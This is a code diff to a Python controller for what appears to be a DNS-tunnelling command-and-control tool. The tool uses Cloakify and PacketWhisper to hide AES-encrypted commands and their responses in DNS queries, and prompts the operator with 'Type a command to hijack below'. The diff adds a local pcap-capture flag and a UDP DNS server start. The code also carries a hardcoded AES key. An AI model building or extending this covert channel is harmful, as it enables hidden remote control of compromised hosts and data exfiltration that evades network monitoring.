@@ -5,6 +5,7 @@ from decloakify import Decloakify
 from aes_encrypt import decrypt_message, encrypt_message
 from cloakify import Cloakify
 from packetWhisper import ExtractDNSQueriesFromPCAP, ExtractPayloadFromDNSQueries, TransferCloakedFile
+from dns_server import start_udp_server
 
 # AES Key
 key = b'VijMwRNSQHALXQodmjCdH4UB7SCw/+EpnuBXfko7ReyqG3oYAky0eYxxx92xi49q'[:32]
@@ -32,12 +33,14 @@ def send_command(command, dns='localhost'):
     os.remove(cloaked_command)
 
 
-def receive_response(dns='localhost'):
-    subprocess.call(['python', 'pcapCapture.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
-    dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_response.pcap", osStr="Windows")
-    cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
+def receive_response(dns='localhost', local=False):
+    cloakedFile = "cloaked.payload"
+    if local:
+        subprocess.call(['python', 'pcapCapture.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
+        dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_response.pcap", osStr="Windows")
+        cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )
 
-    cloaked_response = cloakedFile #"cloaked.payload"
+    cloaked_response = cloakedFile 
     
     decloaked_response = "decloaked_response.txt"
     
@@ -65,7 +68,7 @@ def receive_response(dns='localhost'):
     # Remove useless file after execution
     os.remove(cloaked_response)
     os.remove(decloaked_response)
-
+    start_udp_server()
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
@@ -123,6 +126,7 @@ i@@m               '///|-     >f^    |/   }rnf,                   B@@'
         '-d','--dns',
         type=str,
     )
+    parser.add_argument('--local', action='store_true', help="If both sender and receiver are on the same LAN, use this flag to capture the pcap locally.") 
     args = parser.parse_args()
     print("Type a command to hijack below:")
     subprocess.Popen(['python', 'dns_server.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -136,6 +140,6 @@ i@@m               '///|-     >f^    |/   }rnf,                   B@@'
             send_command(command)
         if args.dns:
             try:
-                receive_response(dns) 
+                receive_response(dns, args.local) 
             except Exception as e:
                 print(f'Something wrong happend during the connection: {e}')
